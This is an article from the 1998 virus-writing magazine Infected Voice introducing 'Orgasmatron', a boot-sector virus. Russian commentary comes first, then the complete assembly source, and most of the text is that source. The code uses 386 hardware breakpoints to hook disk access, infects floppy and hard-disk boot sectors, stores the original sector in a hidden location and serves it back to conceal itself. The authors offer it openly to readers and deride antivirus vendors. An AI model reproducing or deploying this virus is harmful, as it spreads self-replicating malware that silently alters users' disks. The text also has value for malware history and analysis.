COMMENT * //

      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV   1998
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ ▀▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ ▄▄█ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄▄ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
          (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.

                             Orgasmatron

                     (c) Vecna & Eternal Maverick

      Итак, перед вами единственный (?) в своем роде и уникальный бутовый
вирус. Лежащая в его основе идея - использование аппаратного брейкпоинта
(точки останова) и отладочных регистров процессоров Intel 386 и старше.
      Мысль написать что-то подобное появилась в клубе еще 2 или 3 года
назад, в одном из ранних IV была даже статья посвященная этому. Однако,
от проекта до его реализации прошло много времени. Первым, кто не поленился
и создал более или менее рабочую версию, стал Vecna. В течение 2 или 3
месяцев с перерывами в пару недель для написания других вирусов и решения
накопившихся проблем (как-то сдача сессий, подготовка диплома, госэкзамены)
мы вместе разрабатывали, дорабатывали, совершенствовали и исправляли
исходный текст, который занимает < 5 Kб (без комментариев и шапки).
      Тот, кто читал 29A выпуск 2 уже видел альфа-версию этого вируса. Но
к сожалению ранее опубликованый вариант абсолютно нежизнеспособен и
практически неработоспособен, хотя уже включен в антивирусную базу
Касперского (зачем ?).
      Теперь пару слов о файлах, находящихся в этом каталоге:

             ORG.ASM     - комментированный исходник
             ORG.BOT     - для тех, кому лень компилировать
             MAKE.BAT    - пакетный файл для компиляции
             EXE2COM.COM - для тех, у кого нет
             INSTALL.ASM - исходный текст программульки для инсталляции в
                           бут-сектор
             CLEAN.ASM   - исходный текст программульки для очистки
                           бут-сектора (чистый бут-сектор необходимо
                           предварительно записать в файл NORMAL.BOT в
                           том же каталоге, где CLEAN.COM)

      Позволю себе еще несколько общих замечаний:

- ORGASMATRON не представляет из себя значительной угрозы для пользователей
(в худшем смысле этого слова) ПК. Несмотря на работоспособность, отсутствие
(?) ошибок, совместимость с Windows 95 и QEMM (под ними не зависает, но и не
работает) и корректную загрузку на 286, это всего лишь экспериментальная
разработка. Единственной целью, преследовавшейся при написании этого вируса,
было создание красивого и компактного кода.
- Данилов и Касперский могут не включать ORGASMATRON в свои антивирусные
базы, тем более, что для этого им придется потратить свое драгоценное время,
оторвавшись от споров о том, кто первым написал DrWeb и/или AVP и научился
детектировать макро-вирусы, и обливания друг друга гавном.
- Все пожелания, сообщения об ошибках и предложения (желательно вместе с
исходным текстом :) и комментариями) можно и нужно посылать на адрес клуба.

                                                      Eternal Maverick

// *

.MODEL TINY
.CODE
.8086
ORG 0H

START   PROC
        jmp loco
        nop
ENDP    START

;----------------------------------
; Структура Boot Parameters Block
;----------------------------------

BPB     STRUC
bpb_oem db 8 dup (?)
bpb_b_s dw ?
bpb_s_c db ?
bpb_r_s dw ?
bpb_n_f db ?
bpb_r_e dw ?
bpb_t_s dw ?
bpb_m_d db ?
bpb_s_f dw ?
bpb_s_t dw ?
bpb_n_h dw ?
bpb_h_d dw ?
bpb_sht db 20h dup (?)
BPB     ENDS

BOOT    BPB <>

;------------------------------------
; Почти стандартная часть загрузчика,
; с откусыванием 1Kb памяти
;------------------------------------
LOCO    PROC
        cli
        sub ax, ax
        mov ss, ax
        mov sp, 7c00h
        push cs
        pop ds
        dec word ptr ds:[413h]
        int 12h
        mov cl, 10
        ror ax, cl
        mov es, ax
;-----------------------------------
; Проверка на вирус в памяти и при
; необходимости копирование кода в
; тот самый 1Kb
;-----------------------------------
        xor di, di
        mov si, sp
        mov cx, 0100h
        push es
        cmp byte ptr es:[di+mymark],'*'
        mov  ax, offset restore
        je   NoCopy
        rep movsw
        mov  ax, offset strtovr
NoCopy:
        push ax
        retf            ; Передача управления на STRTOVR
ENDP    LOCO

STRTOVR PROC
;---------------------------------------
; Перехват прерывания 6, чтобы отловить
; загрузку на 286 и не зависнуть...
;---------------------------------------
        mov  byte ptr cs:[i13InUse], 0
        push dword ptr ds:[6*4]
        mov word ptr ds:[6*4], offset is286orlower
        mov word ptr ds:[6*4+2], cs
.386P
;---------------------------------------
; Сохранение адреса 13h и перехват 1Сh
;---------------------------------------
        mov  eax, dword ptr ds:[13h*4]       ; Первый байт этой инструкции
                                             ; имеет код 66h и вызывает
                                             ; Invalid Opcode на 286
        mov  dword ptr cs:[old13], eax
        mov  eax, dword ptr ds:[1Ch*4]
        mov  dword ptr cs:[old1C],eax
        mov  word ptr ds:[1Ch*4],offset int1C
        mov  word ptr ds:[1Ch*4+2],cs
        jmp  installed
;-----------------------------------------
; Загрузка стандартного бут-сектора и 
; передача ему управления (в случае 286
; еще и освобождение 1Кb памяти)
;-----------------------------------------

.8086
is286orlower:
        inc word ptr ds:[413h]
installed:
        pop dword ptr ds:[6*4]  ; восстановление int 6
        sti
restore:
        push ds
        pop  es

        xor ax, ax
        int 13h
        mov bx, 7c00h
        call SetForRead
        db 0eah
        dw 07c00h
        dw 0h
ENDP    STRTOVR

.386P

;----------------------------------
; Запись оригинального бут-сектора
; в "тайное место" или его чтение
; оттуда
;----------------------------------
SetForRead:
        mov ax, 0201h
SetCXDXDo13:
        push ax
        cmp dl, 80h
        jle harddrive
floppydrive:
        mov cx, word ptr es:[bx.bpb_r_e+3]
        shr cx, 4
        movzx ax, byte ptr es:[bx.bpb_n_f+3]
        mul word ptr es:[bx.bpb_s_f+3]
        add cx, ax
        inc cx
        sub cx, word ptr es:[bx.bpb_s_t+3]
        mov dh, 1
        jmp goexit
harddrive:
        mov ah, 8
        int 13h
        and cx, 0111111b
        mov dx,80h
goexit:
        pop ax
;-----------------------
;       Вызов 13h
;-----------------------
INT13:
        pushf
        db 9ah
old13   equ this dword
        dd ?
        ret

;-----------------------------------------
; Установка breakpoint с преобразованием
; адреса в 32-х разрядный вид
;-----------------------------------------
SETDR   PROC
        push ds
        pushad
        push 0
        pop ds
        mov word ptr ds:[1*4], offset int1
        mov word ptr ds:[1*4+2], cs
        mov byte ptr cs:[change], 90h
        movzx eax, word ptr cs:[old13]
        movzx ebx, word ptr cs:[old13+2]
        shl ebx, 4
        add ebx, eax
        mov dr3, ebx
        mov eax, dr7
        or al, 010000000b
        mov dr7, eax
        popad
        pop ds
        ret
ENDP    SETDR

;--------------------------------------
;       Обработчик 1Сh
;--------------------------------------
INT1C   PROC
        cmp byte ptr cs:[i13InUse], 0   ; Флажок, если не 0, то
                                        ; находимся внутри int 1
        jne int1isrunning
        call setdr
int1isrunning:
        db  0eah
old1C   dd ?
ENDP    INT1C

;--------------------------------------
;       Обработчик int 1
;--------------------------------------
INT1    PROC
;--------------------------------------
;       Cохранение и очистка dr6
;--------------------------------------
        push eax
        mov eax, dr6
        mov dword ptr cs:[savedr6], eax
        xor eax, eax
        mov dr6, eax
        mov eax, dr7
        and al, not 010000000b
        mov dr7, eax
        pop eax
        nop             ; Заменяется на IRET при необходимости
change  equ byte ptr $-1
ENDP    INT1

DEBUG   PROC
        push eax
        push ds
        push cs
        pop ds
        inc byte ptr [i13InUse]         ; Выставить флажок
;----------------------------------
;       Проверка на чтение/запись
;----------------------------------
        shr  ah,1
        cmp  ah,1
        jne  done                       ; Реагирует только на 2 и 3 в AH
;----------------------------------
        mov eax, -1                     ; Сюда сохраняется dr6
savedr6 equ dword ptr $-4
        test ax, 0100000000001000b
        jz  done                      ; Проверка на интересующие события
                                      ; (условия вызова INT 1 и номер
                                      ; breakpoint)
        mov byte ptr [change], 0cfh   ; Поставить IRET, чтоб не беспокоили
;----------------------------------
;       Проверка на обращение к
;       бут-сектору
;----------------------------------
        cmp cx, 1
        jne done
        cmp dl, 80h
        jg  floppy
        cmp dh,1
        je  bootaccess
        jmp short done
floppy:
        or  dh,dh
        jne done
bootaccess:
        pop ds
        pop eax
        add sp, 6
        call int13
        pushf
        push ax
        jc error

        cmp byte ptr es:[bx+offset mymark], '*' ; Метка зараженности
mymark  equ byte ptr $-1
        je stealth                              ; Если заражен, то
                                                ; пытаемся маскироваться,
                                                ; если нет - заражаем
;---------------------------------
;       Сохранение оригинального
;       бут-сектора
;---------------------------------
        pusha
        mov ax, 0301h
        call setcxdxdo13
        popa
        jc error
;---------------------------------
;  Перенос BPB и запись себя
;---------------------------------
        pusha
        push es
        push ds
        push es
        pop ds
        push cs
        pop es
        mov di,offset boot
        lea si,[bx+3]
        mov cx,3bh
        cld
        rep movsb
        mov ax, 0301h
        xor bx,bx
        inc cx          ; CX=0 after REP MOVSB
        mov dh,0
        cmp dl,80h
        jg  floppydisk
        inc dh
floppydisk:
        call int13
        pop ds
        pop es
        popa
stealth:
;----------------------------------
;       Читаем оригинальный сектор
;----------------------------------
        pusha
        call SetForRead
        popa
error:
        dec byte ptr cs:[i13InUse]      ; Сбрасываем флаг
        pop ax
        popf
        retf 2                          ; Вот и все
done:
        dec byte ptr [i13InUse]
        pop ds
        pop eax
        iret
ENDP    DEBUG

i13InUse db -1                          ; Флажок

ORG 01FEH                               ; А по смещению 01FEh должна быть
                                        ; метка бут-сектора
        db 55h,0aah

BUFFER  EQU THIS BYTE

END     START